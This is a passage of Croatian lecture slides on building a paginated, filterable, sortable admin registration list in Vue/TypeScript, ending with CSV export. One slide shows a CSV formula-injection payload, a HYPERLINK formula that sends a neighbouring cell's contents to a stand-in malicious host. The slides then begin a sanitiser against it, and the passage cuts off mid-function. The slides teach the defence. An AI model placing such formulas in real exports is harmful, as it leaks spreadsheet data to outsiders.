200 OK    [ 20 zapisa ]
\end{lstlisting}

\vspace{0.5em}
Poslužitelj bez parametara vraća prvih dvadeset zapisa, što je zadana vrijednost u ovom projektu. Zahtjev nije odbijen i pogreške nema.

\vspace{0.5em}
U tablici je dvadeset redaka, a ništa na zaslonu ne kaže da ih ima još dvjesto osamdeset. Prikaz izgleda potpun, a nije.
\end{frame}

% ------------------------------------------------------------
\begin{frame}[fragile]{Nepotpun popis (II)}
Prvi odgovor koji se nameće je zatražiti sve zapise odjednom:

\begin{lstlisting}
GET /api/competitions/1/registrations/?limit=1000
422 {"code": "validation_error", ...}
\end{lstlisting}

\vspace{0.4em}
Statusni kod \texttt{422} znači da parametar ne odgovara shemi. Poslužitelj odgovor ograničava namjerno, u ovom projektu na sto zapisa: popis s vremenom raste, a s njim i upit, prijenos i iscrtavanje.

\vspace{0.6em}
Drugi je odgovor popis dohvaćati u dijelovima i korisniku ponuditi prijelaz među njima. Prikaz tada mora znati koji dio traži i postoji li sljedeći.

\vspace{0.6em}
Takav se prikaz popisa naziva \textbf{straničenje} (engl. \emph{pagination}).
\end{frame}

% ============================================================
\sekcija{Popis koji raste}{Dio popisa zadan parametrima, kraj popisa bez ukupnog broja zapisa, stranica u adresi, prijelaz među stranicama.}

% ------------------------------------------------------------
\begin{frame}{Dio popisa}
Katalog knjižnice ne prikazuje sve knjige jednog autora odjednom. Prikaže prvih dvadeset i nudi prijelaz na sljedećih dvadeset. Za sljedeću stranicu katalog treba znati samo koliko je zapisa već prikazao.

\vspace{0.6em}
API to izražava dvama parametrima: \texttt{limit} kaže koliko zapisa vratiti, a \texttt{offset} koliko ih preskočiti. Uz dvadeset zapisa po stranici:

\vspace{0.4em}
\begin{center}
{\small
\setlength{\tabcolsep}{8pt}
\renewcommand{\arraystretch}{1.3}
\begin{tabular}{@{}L{2.2cm}L{1.8cm}L{1.8cm}L{3.2cm}@{}}
  \toprule
  \textbf{Stranica} & \texttt{limit} & \texttt{offset} & \textbf{Zapisi} \\
  \midrule
  1 & 20 & 0  & od 1. do 20. \\
  2 & 20 & 20 & od 21. do 40. \\
  3 & 20 & 40 & od 41. do 60. \\
  \bottomrule
\end{tabular}
}
\end{center}

\vspace{0.4em}
Stranica $n$ počinje iza $(n-1)\cdot 20$ preskočenih zapisa. Poredak zapisa zadaje poslužitelj, inače bi isti zapis mogao doći na dvije stranice.
\end{frame}

% ------------------------------------------------------------
\begin{frame}[fragile]{Kraj popisa (I)}
Odgovor je običan niz zapisa, bez ukupnog broja. Prvi odgovor koji se nameće: kraći odgovor od tražene veličine znači da dalje nema zapisa.

\vspace{0.3em}
Natjecanje ima točno četrdeset prijava:

\begin{lstlisting}[keepspaces]
?limit=20&offset=0     20 zapisa    stranica 1, nudi se <@sljedeća@>
?limit=20&offset=20    20 zapisa    stranica 2, nudi se <@sljedeća@>
?limit=20&offset=40     0 zapisa    stranica 3 je prazna
\end{lstlisting}

\vspace{0.4em}
Druga stranica je puna kao i prva, pa je prikaz ne razlikuje od stranice iza koje ima još zapisa.

\vspace{0.4em}
Kad je broj zapisa djeljiv s veličinom stranice, poveznica na sljedeću stranicu vodi na praznu tablicu.
\end{frame}

% ------------------------------------------------------------
\begin{frame}{Kraj popisa (II)}
Prikaz treba znati samo postoji li barem jedan zapis iza ove stranice. Do toga podatka vode tri puta:

\vspace{0.5em}
\begin{center}
{\small
\setlength{\tabcolsep}{6pt}
\renewcommand{\arraystretch}{1.35}
\begin{tabular}{@{}L{2.6cm}L{4.4cm}L{5.0cm}@{}}
  \toprule
  \textbf{Način} & \textbf{Prikaz zna da ima još} & \textbf{Cijena} \\
  \midrule
  ukupan broj & šalje ga poslužitelj & drugi upit i promjena API-ja \\
  kraći odgovor & stiglo je manje od traženog & prazna stranica na kraju popisa \\
  zapis viška & stigao je zapis više & redak više u svakom odgovoru \\
  \bottomrule
\end{tabular}
}
\end{center}

\vspace{0.5em}
\begin{konvencija}[Izbor, ne pravilo]
API ovog projekta ne vraća ukupan broj, a izmjena odgovora bila bi izmjena ugovora prema svim klijentima. Projekt zato traži zapis viška.
\end{konvencija}
\end{frame}

% ------------------------------------------------------------
\begin{frame}[fragile]{Zapis viška}
\begin{lstlisting}[language=typescript]
// src/lib/pager.ts
export function pageRequest(page: number, size: number = PAGE_SIZE) {
  return { limit: size + 1, offset: (page - 1) * size }
}

export function splitPage<T>(items: T[], size: number = PAGE_SIZE) {
  return { rows: items.slice(0, size), hasNext: items.length > size }
}
\end{lstlisting}

\vspace{0.3em}
Uz četrdeset prijava zahtjev za drugu stranicu glasi \texttt{limit=21\&offset=20}. Stiže dvadeset zapisa, pa treće stranice nema.

\vspace{0.3em}
Zapis viška se ne prikazuje. To je prvi zapis sljedeće stranice, a stiže ponovno kad se ona otvori. Prikaz zato \texttt{offset} računa od veličine stranice, a ne od \texttt{limit}.
\end{frame}

% ------------------------------------------------------------
\begin{frame}{Stranica u adresi (I)}
Organizator je na trećoj stranici popisa. Ako je broj stranice vrijednost koju drži komponenta:

\vspace{0.5em}
\begin{itemize}
  \itemsep0.45em
  \item osvježavanje stranice vraća prikaz na prvu stranicu
  \item tipka Natrag ne vodi na drugu stranicu, nego izlazi s natjecanja
  \item poveznica koju organizator pošalje suradniku otvara prvu stranicu
\end{itemize}

\vspace{0.7em}
Komponenta svoje vrijednosti drži u memoriji kartice. Preglednik ne zna za njih, pa ih ne pamti u povijesti i ne prenosi u poveznici.

\vspace{0.7em}
Stanje popisa tako nestaje pri svakom događaju koji prikaz učita iznova.
\end{frame}

% ------------------------------------------------------------
\begin{frame}[fragile]{Stranica u adresi (II)}
Trgovina na webu kategoriju i stranicu drži u adresi, \texttt{/cipele?velicina=42\&stranica=3}, koju preglednik pamti, dijeli i vraća.

\begin{lstlisting}[language=typescript]
// src/components/AdminRegistrations.vue
const page = computed(() => pageFromQuery(route.query.stranica))
const pageLink = (n: number) => ({
  query: { ...route.query, stranica: n === 1 ? undefined : n },
})
\end{lstlisting}

\begin{lstlisting}[language=typescript]
// src/lib/pager.ts
export function pageFromQuery(value: unknown): number {
  const page = Number(typeof value === 'string' ? value : NaN)
  return Number.isInteger(page) && page >= 1 ? page : 1
}
\end{lstlisting}

\vspace{0.1em}
Adresu može upisati bilo tko, pa je ona ulaz korisnika. \texttt{?stranica=-3} i \texttt{?stranica=abc} daju prvu stranicu, a ne zahtjev s negativnim \texttt{offset}.
\end{frame}

% ------------------------------------------------------------
\begin{frame}[fragile]{Prijelaz među stranicama}
\begin{lstlisting}[language=html]
<!-- src/components/AdminRegistrations.vue -->
<nav v-if="page > 1 || current.hasNext" class="pager"
     aria-label="Stranice prijava">
  <RouterLink v-if="page > 1" :to="pageLink(page - 1)">
    Prethodna</RouterLink>
  <span v-else class="disabled" aria-hidden="true">Prethodna</span>
  <span aria-current="page">Stranica {{ page }}</span>
  <!-- <@isto za \enquote{Sljedeća}, uz uvjet current.hasNext@> -->
</nav>
\end{lstlisting}

\vspace{0.3em}
Prijelaz je poveznica: svaka stranica ima svoju adresu, koja ulazi u povijest preglednika, pa Natrag vodi na prethodnu stranicu popisa, a stranica se može otvoriti u novoj kartici.

\vspace{0.3em}
Na prvoj stranici \enquote{Prethodna} je tekst na istom mjestu, da se ostatak retka ne pomiče.
\end{frame}

% ------------------------------------------------------------
\begin{frame}{Vježba: tri prijave na dvije stranice}
Polazno stanje je \emph{Zimski kup} bez prijava.

\vspace{0.6em}
\begin{enumerate}
  \itemsep0.35em
  \item Kao klub \texttt{behemot@plreg.hr} prijavite na \emph{Zimski kup} Anu Horvat u kategoriji \texttt{63} i Ivana Perića u kategoriji \texttt{83}.
  \item Kao klub \texttt{sokol@plreg.hr} prijavite Marka Babića u kategoriji \texttt{83}.
  \item U \codefile{src/lib/pager.ts} postavite \texttt{PAGE\_SIZE} na \texttt{2}.
  \item Kao organizator \texttt{admin@plreg.hr} otvorite \emph{Zimski kup} i u kartici Mreža zabilježite \texttt{limit} i \texttt{offset} zahtjeva za prijave.
  \item Prijeđite na drugu stranicu, zabilježite iste vrijednosti, pa pritisnite Natrag i osvježite stranicu.
  \item Vratite \texttt{PAGE\_SIZE} na \texttt{20}.
\end{enumerate}

\vspace{0.6em}
Koliko je zapisa stiglo na svaki od dvaju zahtjeva i po čemu je prikaz na drugoj stranici znao da treće nema?
\end{frame}

% ============================================================
\sekcija{Sužavanje popisa}{Filtar koji poslužitelj poznaje, pretraga nad prikazanom stranicom, mjesto filtra, usporedba i razvrstavanje po pravilima jezika.}

% ------------------------------------------------------------
\begin{frame}{Filtar u adresi (I)}
Filtar po stanju je parametar zahtjeva, pa bira koje zapise poslužitelj vraća. Stoji u adresi, uz stranicu, iz istih razloga kao i ona.

\vspace{0.6em}
Ako svaka promjena filtra, kao i promjena stranice, dodaje korak u povijest preglednika:

\vspace{0.3em}
\begin{itemize}
  \itemsep0.45em
  \item tipka Natrag prolazi kroz sve filtre koje je korisnik isprobao
  \item promjena filtra na trećoj stranici ostavlja korisnika na trećoj stranici kraćeg popisa, koja može biti prazna
\end{itemize}

\vspace{0.6em}
Uz to, vrijednost koju je netko upisao u adresu, \texttt{?stanje=xyz}, odlazi poslužitelju, a on je odbija s \texttt{422}. Taj kod znači da parametar ne odgovara shemi, pa korisnik vidi pogrešku za popis koji postoji.
\end{frame}

% ------------------------------------------------------------
\begin{frame}[fragile]{Filtar u adresi (II)}
\begin{lstlisting}[language=typescript]
// src/components/AdminRegistrations.vue
const STATUS_VALUES: RegistrationStatus[] = ['active', 'withdrawn']
const status = computed<RegistrationStatus | undefined>(() =>
  STATUS_VALUES.find((s) => s === route.query.stanje),
)
function setStatus(value: string) {
  router.replace({
    query: { ...route.query, stanje: value || undefined,
             stranica: undefined },
  })
}
\end{lstlisting}

\vspace{0.1em}
\texttt{replace} mijenja adresu bez novog koraka u povijesti, a stranica se briše iz adrese, pa popis nakon promjene filtra počinje od prve stranice.

\vspace{0.3em}
\texttt{status} prihvaća samo poznatu vrijednost. Nepoznata, \texttt{?stanje=xyz}, znači popis bez filtra.
\end{frame}

% ------------------------------------------------------------
\begin{frame}[fragile]{Pretraga nad prikazanom stranicom (I)}
API nema parametar za ime natjecatelja. Pretragu po imenu zato radi preglednik, nad zapisima koje ima, a to je samo prikazana stranica:

\begin{lstlisting}[language=typescript]
// src/components/AdminRegistrations.vue
const searched = computed(() =>
  current.value.rows.filter((r) =>
    matchesQuery(`${r.lifter.first_name} ${r.lifter.last_name}`,
                 query.value)),
)
\end{lstlisting}

\vspace{0.3em}
Natjecatelj koji odgovara upitu, a stoji na trećoj stranici, ne pojavljuje se. Korisnik koji to ne zna zaključit će da natjecatelja nema.
\end{frame}

% ------------------------------------------------------------
\begin{frame}[fragile]{Pretraga nad prikazanom stranicom (II)}
Granica pretrage zato je napisana uz polje:

\begin{lstlisting}[language=html]
<!-- src/components/AdminRegistrations.vue -->
<input id="filter-query" v-model="query" type="search"
       aria-describedby="filter-query-hint" />
<p id="filter-query-hint" class="hint">
  <@Pretražuje samo prikazanu stranicu.@>
</p>
\end{lstlisting}

\vspace{0.3em}
\texttt{aria-describedby} veže tekst uz polje, pa ga čitač zaslona pročita kad polje dobije fokus, a ne samo kad korisnik naiđe na njega.
\end{frame}

% ------------------------------------------------------------
\begin{frame}{Mjesto filtra}
\vspace{0.3em}
\begin{center}
{\small
\setlength{\tabcolsep}{6pt}
\renewcommand{\arraystretch}{1.35}
\begin{tabular}{@{}L{2.8cm}L{4.6cm}L{4.2cm}@{}}
  \toprule
   & \textbf{Na poslužitelju} & \textbf{U pregledniku} \\
  \midrule
  Obuhvaća & cijeli popis & prikazanu stranicu \\
  Cijena & zahtjev pri svakoj promjeni & nijedan zahtjev \\
  Traži & parametar u API-ju & ništa \\
  U ovom projektu & stanje prijave & ime natjecatelja \\
  \bottomrule
\end{tabular}
}
\end{center}

\vspace{0.6em}
Filtar koji bira zapise pripada poslužitelju. Filtar u pregledniku sužava ono što je već na zaslonu, pa je točan samo dok je cijeli popis na zaslonu.

\vspace{0.4em}
Nad popisom po stranicama filtar u pregledniku daje prazan rezultat za zapis koji postoji na drugoj stranici. Pretraga cijelog popisa traži parametar u API-ju i upit nad bazom.
\end{frame}

% ------------------------------------------------------------
\begin{frame}[fragile]{Usporedba po pravilima jezika}
Telefonski imenik Čopa stavlja odmah iza Cvora. Obična usporedba nizova gleda brojčane vrijednosti znakova, a u njima slova s dijakriticima stoje iza svih ostalih:

\vspace{0.4em}
\begin{center}
{\small
\setlength{\tabcolsep}{6pt}
\renewcommand{\arraystretch}{1.3}
\begin{tabular}{@{}L{3.6cm}L{3.6cm}L{3.6cm}@{}}
  \toprule
  \textbf{Ulaz} & \textbf{Usporedba znakova} & \textbf{Usporedba po jeziku} \\
  \midrule
  Duda, Čop, Cvor, Ćosić & Cvor, Duda, Ćosić, Čop & Cvor, Čop, Ćosić, Duda \\
  \bottomrule
\end{tabular}
}
\end{center}

\begin{lstlisting}[language=typescript]
// src/lib/sort.ts
const collator = new Intl.Collator('hr', { sensitivity: 'base' })
export const compareText = (a: string, b: string): number =>
  collator.compare(a, b)
\end{lstlisting}

\vspace{0.1em}
\texttt{Intl.Collator} uspoređuje po pravilima zadanog jezika, a \texttt{sensitivity: 'base'} ne razlikuje mala i velika slova. Bez njega popis izgleda razvrstano dok se ne pojavi prvo prezime s dijakritikom.
\end{frame}

% ------------------------------------------------------------
\begin{frame}[fragile]{Pretraga bez dijakritika}
Korisnik koji tipka na mobitelu bez hrvatske tipkovnice upisuje \texttt{colak}. Usporedba znak po znak u imenu Čolak taj niz ne nalazi.

\begin{lstlisting}[language=typescript]
// src/lib/sort.ts
function fold(text: string): string {
  return text
    .normalize('NFD')
    .replace(/\p{M}/gu, '')
    .replace(/<@đ@>/gi, 'd')
    .toLowerCase()
}
export const matchesQuery = (text: string, query: string): boolean =>
  fold(text).includes(fold(query.trim()))
\end{lstlisting}

\vspace{0.2em}
Unicodeov oblik \texttt{NFD} rastavlja Č na slovo C i kvačicu kao zaseban znak, a \texttt{\textbackslash p\{M\}} hvata takve znakove. Đ nije D s dodanim znakom nego zasebno slovo, pa ga rastavljanje ne dira i zamjenjuje se izričito.
\end{frame}

% ------------------------------------------------------------
\begin{frame}[fragile]{Razvrstavanje kopije}
Kategorije su tekst, a kao tekst \texttt{"105"} stoji ispred \texttt{"59"}, jer se uspoređuje znak po znak. Metoda \texttt{sort} uz to mijenja polje nad kojim se poziva.

\begin{lstlisting}[language=typescript]
// src/lib/sort.ts
function categoryValue(category: string): number {
  const value = Number.parseFloat(category)
  return category.endsWith('+') ? value + 0.5 : value
}
export function sortRegistrations(rows: Registration[], key: SortKey,
                                  dir: SortDir): Registration[] {
  const sign = dir === 'asc' ? 1 : -1
  return [...rows].sort((a, b) => sign * COMPARE[key](a, b))
}
\end{lstlisting}

\vspace{0.2em}
Kategorija se uspoređuje kao broj, a otvorena kategorija \texttt{120+} stoji iza \texttt{120}. \texttt{[...rows]} pravi kopiju: razvrstavanje izvornog polja promijenilo bi i podatke iz kojih se računaju druge izvedene vrijednosti.
\end{frame}

% ------------------------------------------------------------
\begin{frame}{Niz izvedenih vrijednosti}
\begin{center}
\begin{tikzpicture}[
  font=\small,
  kut/.style={draw=lineclr,fill=tint,rounded corners=2pt,inner sep=4pt,minimum height=11mm,minimum width=18mm,align=center},
  str/.style={-{Stealth[length=2mm]},draw=ink2,thick}
]
  \node[kut] (a) at (0,0) {\texttt{data}\\{\scriptsize odgovor}};
  \node[kut] (b) at (2.75,0) {\texttt{current}\\{\scriptsize stranica}};
  \node[kut] (c) at (5.5,0) {\texttt{searched}\\{\scriptsize pretraga}};
  \node[kut] (d) at (8.25,0) {\texttt{shown}\\{\scriptsize poredak}};
  \node[kut] (e) at (10.8,0) {tablica};

  \draw[str] (a) -- (b);
  \draw[str] (b) -- (c);
  \draw[str] (c) -- (d);
  \draw[str] (d) -- (e);

  \node[font=\scriptsize,color=mutedclr,align=center] at (0,1.05) {poslužitelj};
  \node[font=\scriptsize,color=mutedclr] at (5.5,1.05) {preglednik, \texttt{computed}};
  \draw[color=lineclr] (1.5,0.8) -- (1.5,-0.8);

  \node[font=\scriptsize,color=mutedclr,align=center] at (0,-1.15) {stanje, stranica\\iz adrese};
  \node[font=\scriptsize,color=mutedclr,align=center] at (5.5,-1.15) {upis u polje\\pretrage};
  \node[font=\scriptsize,color=mutedclr,align=center] at (8.25,-1.15) {klik na\\zaglavlje};
\end{tikzpicture}
\end{center}

\vspace{0.5em}
Svaka vrijednost ovisi o prethodnoj, a ispod je ono što je mijenja. Promjena upita mijenja \texttt{searched}, a time i \texttt{shown}, bez ijednog retka koji ih povezuje.

\vspace{0.4em}
Promjena stanja ili stranice mijenja adresu, a promatrač nad njima šalje novi zahtjev. Koraci koje izvodi poslužitelj zato stoje na početku niza.
\end{frame}

% ------------------------------------------------------------
\begin{frame}{Vježba: filtar i pretraga}
Na \emph{Zimskom kupu} su prijave Ane Horvat i Ivana Perića (klub \texttt{behemot@plreg.hr}) i Marka Babića (klub \texttt{sokol@plreg.hr}).

\vspace{0.6em}
\begin{enumerate}
  \itemsep0.35em
  \item Kao klub \texttt{behemot@plreg.hr} odjavite prijavu Ivana Perića.
  \item Kao organizator \texttt{admin@plreg.hr} otvorite \emph{Zimski kup}, odaberite stanje \enquote{odjavljene} i prepišite adresu iz trake preglednika.
  \item Otvorite prepisanu adresu u novoj kartici, pa se vratite u prvu i pritisnite Natrag.
  \item U adresi zamijenite vrijednost parametra \texttt{stanje} sa \texttt{xyz} i u kartici Mreža pogledajte poslani zahtjev.
  \item Uz sve prijave upišite u pretragu \texttt{peric}, bez dijakritika.
\end{enumerate}

\vspace{0.6em}
Kamo je vodio Natrag u trećem koraku i zašto zahtjev u četvrtom koraku poslužitelj nije odbio?
\end{frame}

% ============================================================
\sekcija{Tablica i radnje nad retkom}{Uski zaslon, smjer razvrstavanja u zaglavlju, potvrda prije radnje koja se ne poništava, preuzimanje popisa.}

% ------------------------------------------------------------
\begin{frame}[fragile]{Tablica na uskom zaslonu}
Tablica sa šest stupaca na zaslonu mobitela ne stane. Kad preglednik prelomi ćelije, redak se razlije preko nekoliko redaka i stupci se više ne poklapaju.

\begin{lstlisting}[language=html]
/* src/assets/main.css */
.table-wrap {
  overflow-x: auto;
  /* podloga, obrub i zaobljeni kutovi */
}
th, td { padding: 10px 12px; text-align: left; white-space: nowrap; }
\end{lstlisting}

\vspace{0.2em}
Ćelije se ne prelamaju, a okvir oko tablice dopušta vodoravno pomicanje, pa redak ostaje jedan redak. Cijena je da korisnik na mobitelu dio stupaca vidi tek nakon pomicanja.

\vspace{0.2em}
Druga mogućnost je ispod zadane širine svaki redak prikazati kao karticu. Takav raspored traži zaseban CSS za uski zaslon i gubi usporedbu po stupcima.
\end{frame}

% ------------------------------------------------------------
\begin{frame}[fragile]{Smjer razvrstavanja u zaglavlju}
Tipkovnica ne dolazi do naslova stupca na koji se klikne mišem, a čitač zaslona ne zna po kojem je stupcu popis razvrstan.

\begin{lstlisting}[language=html]
<!-- src/components/AdminRegistrations.vue -->
<th scope="col" :aria-sort="ariaSort('name')">
  <button class="sort" type="button" @click="sortBy('name')">
    Natjecatelj
  </button>
</th>
\end{lstlisting}

\begin{lstlisting}[language=typescript]
const ariaSort = (key: SortKey) => sortKey.value === key
  ? (sortDir.value === 'asc' ? 'ascending' : 'descending') : undefined
\end{lstlisting}

\vspace{0.1em}
Gumb u zaglavlju dostupan je tipkovnici. \texttt{aria-sort} čitaču zaslona javlja stupac i smjer, a CSS iz istog atributa crta strelicu, pa se dvije oznake ne mogu razići.
\end{frame}

% ------------------------------------------------------------
\begin{frame}{Radnja koja se ne poništava}
Gumb \enquote{Obriši} stoji u svakom retku, a promašen klik trajno briše natjecatelja.

\vspace{0.5em}
\begin{center}
{\small
\setlength{\tabcolsep}{6pt}
\renewcommand{\arraystretch}{1.35}
\begin{tabular}{@{}L{3.2cm}L{7.0cm}L{1.6cm}@{}}
  \toprule
  \textbf{Radnja} & \textbf{Poništava se} & \textbf{Potvrda} \\
  \midrule
  odjava prijave & gumbom \enquote{Vrati prijavu}, do konačnog roka & ne \\
  povratak prijave & ponovnom odjavom & ne \\
  brisanje natjecatelja & ne & da \\
  \bottomrule
\end{tabular}
}
\end{center}

\vspace{0.4em}
\begin{konvencija}
Potvrdu traži samo radnja koja se ne može poništiti. Korisnik koji potvrđuje svaku radnju nauči potvrđivati bez čitanja, pa potvrda prestane štititi i ondje gdje treba.
\end{konvencija}
\end{frame}

% ------------------------------------------------------------
\begin{frame}{Dijalog za potvrdu (I)}
Dijalog mora jednako raditi s mišem, tipkovnicom i čitačem zaslona:

\vspace{0.5em}
\begin{center}
{\small
\setlength{\tabcolsep}{6pt}
\renewcommand{\arraystretch}{1.3}
\begin{tabular}{@{}L{4.7cm}L{3.4cm}L{3.8cm}@{}}
  \toprule
  \textbf{Zahtjev} & \texttt{div} \textbf{sa zastorom} & \texttt{dialog}, \texttt{showModal()} \\
  \midrule
  fokus ulazi u dijalog & piše se & preglednik \\
  Tab ostaje u dijalogu & piše se & preglednik \\
  ostatak stranice nedostupan & samo mišu, zastorom & preglednik \\
  Escape zatvara dijalog & piše se & preglednik \\
  fokus se vraća na gumb & piše se & preglednik \\
  iznad cijele stranice & premještanje u \texttt{body} & preglednik \\
  \bottomrule
\end{tabular}
}
\end{center}

\vspace{0.5em}
Svaki redak srednjeg stupca je kod koji se može zaboraviti, a dijalog bez nekoga od njih korisnik tipkovnice ne može koristiti.
\end{frame}

% ------------------------------------------------------------
\begin{frame}[fragile]{Dijalog za potvrdu (II)}
\begin{lstlisting}[language=typescript]
// src/components/ConfirmDialog.vue
function sync(open: boolean) {
  if (!dialog.value) return
  if (open && !dialog.value.open) dialog.value.showModal()
  if (!open && dialog.value.open) dialog.value.close()
}
watch(() => props.open, sync)
\end{lstlisting}

\vspace{0.3em}
Element \texttt{dialog} otvoren metodom \texttt{showModal()} sve iz tablice radi sam: drži fokus, ostatak stranice čini nedostupnim i javlja Escape. Iscrtava se u gornjem sloju (engl. \emph{top layer}), iznad svakog elementa stranice, pa ga ne odsijeca ni okvir tablice u kojem je nastao.

\vspace{0.3em}
Je li dijalog otvoren, odlučuje roditelj kroz \texttt{open}; \texttt{sync} to stanje prenosi na element.
\end{frame}

% ------------------------------------------------------------
\begin{frame}[fragile]{Dijalog za potvrdu (III)}
\begin{lstlisting}[language=html]
<!-- src/components/ConfirmDialog.vue -->
<dialog ref="dialog" class="dialog" :aria-labelledby="titleId"
        @cancel.prevent="emit('cancel')">
  <h2 :id="titleId">{{ title }}</h2>
  <slot />
  <button class="btn btn-secondary" type="button" autofocus
          @click="emit('cancel')">Odustani</button>
  <!-- <@gumb s natpisom radnje, npr. \enquote{Obriši}@> -->
</dialog>
\end{lstlisting}

\vspace{0.3em}
Preglednik pritisak na Escape javlja događajem \texttt{cancel}. \texttt{.prevent} sprječava da dijalog zatvori sam, pa o zatvaranju i dalje odlučuje roditelj.

\vspace{0.3em}
\texttt{autofocus} pri otvaranju stavlja fokus na \enquote{Odustani}. Enter tako ne izvodi radnju koja se ne poništava.
\end{frame}

% ------------------------------------------------------------
\begin{frame}[fragile]{Potvrda na mjestu upotrebe (I)}
\begin{lstlisting}[language=typescript]
// src/views/LiftersView.vue
const toDelete = ref<Lifter | null>(null)
async function confirmDelete() {
  const lifter = toDelete.value
  if (!lifter) return
  toDelete.value = null
  await deleteLifter(auth.clubId!, lifter.id)
  <@\komts{uklanjanje iz pohrane i obavijest, ili odbijanje}@>
  ...
}
\end{lstlisting}

\vspace{0.3em}
Gumb \enquote{Obriši} u retku ne briše. Upisuje natjecatelja u \texttt{toDelete}, a dijalog se otvara jer je \texttt{toDelete} različit od \texttt{null}.

\vspace{0.3em}
\texttt{confirmDelete} se poziva tek na potvrdu. Prvo zatvara dijalog, pa šalje zahtjev; poslužitelj natjecatelja s prijavama ne briše i odgovara kodom \texttt{has\_registrations}.
\end{frame}

% ------------------------------------------------------------
\begin{frame}[fragile]{Potvrda na mjestu upotrebe (II)}
\begin{lstlisting}[language=html]
<!-- src/views/LiftersView.vue -->
<ConfirmDialog :open="toDelete !== null" title="Brisanje natjecatelja"
  confirm-label="<@Obriši@>" danger
  @confirm="confirmDelete" @cancel="toDelete = null">
  <p>
    Natjecatelj
    <strong>{{ toDelete?.first_name }} {{ toDelete?.last_name }}</strong>
    <@bit će obrisan. Brisanje se ne može poništiti.@>
  </p>
</ConfirmDialog>
\end{lstlisting}

\vspace{0.3em}
Dijalog nosi ime natjecatelja, jer korisnik u tom trenutku gleda dijalog, a ne redak u kojem je kliknuo.

\vspace{0.3em}
Natpis gumba je glagol radnje, \enquote{Obriši}. Natpis \enquote{U redu} ne bi rekao što će se dogoditi.
\end{frame}

% ------------------------------------------------------------
\begin{frame}{Vježba: dijalog bez miša}
Prijavljeni ste kao klub \texttt{behemot@plreg.hr}. Ana Horvat prijavljena je na \emph{Zimski kup}.

\vspace{0.6em}
\begin{enumerate}
  \itemsep0.35em
  \item Dodajte natjecatelja Test Brisanje, rođenog 01.01.2000., muškog spola.
  \item Samo tipkovnicom dođite do gumba \enquote{Obriši} u njegovu retku i pritisnite Enter.
  \item Pritisnite Tab nekoliko puta i pratite koji element ima fokus.
  \item Pritisnite Escape i provjerite koji element ima fokus.
  \item Obrišite natjecatelja Test Brisanje, pa na isti način pokušajte obrisati Anu Horvat.
\end{enumerate}

\vspace{0.6em}
Koji je element imao fokus nakon otvaranja dijaloga i nakon Escapea i zašto, a koja je provjera odlučila o brisanju u petom koraku?
\end{frame}

% ------------------------------------------------------------
\begin{frame}[fragile]{Preuzimanje popisa (I)}
Organizator treba popis i izvan aplikacije, primjerice za suce. Preglednik datoteku može sastaviti sam, iz podataka koje ima, bez zahtjeva prema poslužitelju:

\begin{lstlisting}[language=typescript]
// src/lib/download.ts
export function downloadText(filename: string, text: string,
                             type: string) {
  const url = URL.createObjectURL(new Blob([text], { type }))
  const link = document.createElement('a')
  link.href = url
  link.download = filename
  link.click()
  URL.revokeObjectURL(url)
}
\end{lstlisting}

\vspace{0.2em}
Datoteka sastavljena od podataka na zaslonu imala bi samo prikazanu stranicu, a izgledala bi potpuno.
\end{frame}

% ------------------------------------------------------------
\begin{frame}[fragile]{Preuzimanje popisa (II)}
\begin{lstlisting}[language=typescript]
// src/api/registrations.ts
export async function fetchAllRegistrations(
  compId: number,
  status?: RegistrationStatus,
): Promise<Registration[]> {
  const all: Registration[] = []
  for (let offset = 0; ; offset += MAX_LIMIT) {
    const page = await fetchRegistrations(compId,
      { status, limit: MAX_LIMIT, offset })
    all.push(...page)
    if (page.length < MAX_LIMIT) return all
  }
}
\end{lstlisting}

\vspace{0.1em}
Popis se dohvaća po najvećem dopuštenom dijelu, uz isti filtar kao na zaslonu. Kraj se prepoznaje po kraćem odgovoru; uz broj zapisa djeljiv sa sto to stoji jedan prazan zahtjev.
\end{frame}

% ------------------------------------------------------------
\begin{frame}{Datoteka za tablični kalkulator (I)}
Format CSV je tekst: redak po zapisu, vrijednosti odvojene razdjelnikom. Tablični kalkulator ga čita prema svojim postavkama, pa ista datoteka kod organizatora može izgledati pokvareno:

\vspace{0.5em}
\begin{center}
{\small
\setlength{\tabcolsep}{6pt}
\renewcommand{\arraystretch}{1.3}
\begin{tabular}{@{}L{3.6cm}L{4.4cm}L{4.0cm}@{}}
  \toprule
  \textbf{Zamka} & \textbf{Što organizator vidi} & \textbf{Rješenje} \\
  \midrule
  zarez kao razdjelnik & cijeli redak u prvom stupcu & točka sa zarezom \\
  kodna stranica & ÄŒolak umjesto Čolak & oznaka na početku \\
  razdjelnik u vrijednosti & redak pomaknut za stupac & vrijednost u navodnicima \\
  vrijednost počinje s \texttt{=} & izvedena formula & apostrof na početku \\
  \bottomrule
\end{tabular}
}
\end{center}

\vspace{0.6em}
Sva rješenja iz tablice stoje u \codefile{src/lib/csv.ts}, u funkciji koja od redaka sastavlja tekst datoteke.
\end{frame}

% ------------------------------------------------------------
\begin{frame}{Datoteka za tablični kalkulator (II)}
Excel kodiranje UTF-8 prepoznaje po oznaci redoslijeda bajtova (engl. \emph{byte order mark}, BOM) na početku datoteke. Bez nje datoteku čita u kodnoj stranici sustava, pa slovo Č, koje u UTF-8 zauzima dva bajta, prikaže kao dva znaka.

\vspace{0.6em}
Razdjelnik ovisi o postavkama računala na kojem se datoteka otvara, a ne o datoteci.

\vspace{0.6em}
\begin{konvencija}[Izbor, ne pravilo]
Standard za CSV (RFC 4180) propisuje zarez, a Excel razdjelnik čita iz regionalnih postavki računala, u kojima je uz hrvatske postavke zarez decimalni znak. Projekt bira točku sa zarezom, jer datoteku otvaraju organizatori s hrvatskim postavkama.
\end{konvencija}
\end{frame}

% ------------------------------------------------------------
\begin{frame}[fragile]{Formula u ćeliji (I)}
Ime natjecatelja upisuje klub, a datoteku otvara organizator. Klub kao ime može upisati:

\begin{lstlisting}
=HYPERLINK("https://zlonamjerna.example/?p="&A2; "Pogledaj")
\end{lstlisting}

\vspace{0.2em}
Organizatorov kalkulator tu vrijednost izvodi kao formulu i prikazuje poveznicu, a klik na nju šalje sadržaj susjedne ćelije na tuđu adresu. Napad se naziva ubacivanje formule (engl. \emph{CSV injection}).

\vspace{0.6em}
Vrijednost je ispravna po svakom pravilu sheme: neprazan tekst u dopuštenoj duljini. Opasna postaje tek u drugom programu, na računalu drugog korisnika.
\end{frame}

% ------------------------------------------------------------
\begin{frame}[fragile]{Formula u ćeliji (II)}
\begin{lstlisting}[language=typescript]
// src/lib/csv.ts
function cell(value: string | number): string {
  let text = String(value)
  if (/^[=+\-@\t\r]/.test(text)) text = `'${text}`
